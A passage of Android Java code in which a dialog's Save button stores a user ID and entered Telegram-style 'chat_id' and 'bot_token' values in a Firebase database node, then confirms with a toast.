		bt1.setText("Save");
		Button bt2 = (Button)
		inflate.findViewById(R.id.bt2);
		bt2.setText("Save");
		bt2.setVisibility(View.GONE);
		bt1.setOnClickListener(new View.OnClickListener(){ public void onClick(View v){
				np = new HashMap<>();
				np.put("uesrID", uuid);
				np.put("chat_id", et1.getText().toString());
				np.put("bot_token", et2.getText().toString());
				users.child("all_user").updateChildren(np);
				np.clear();
				Toast.makeText(AllInfoActivity.this, "success!", Toast.LENGTH_SHORT).show();
				dialog.dismiss();
			}
		});
		dialog.show();
	}
	
}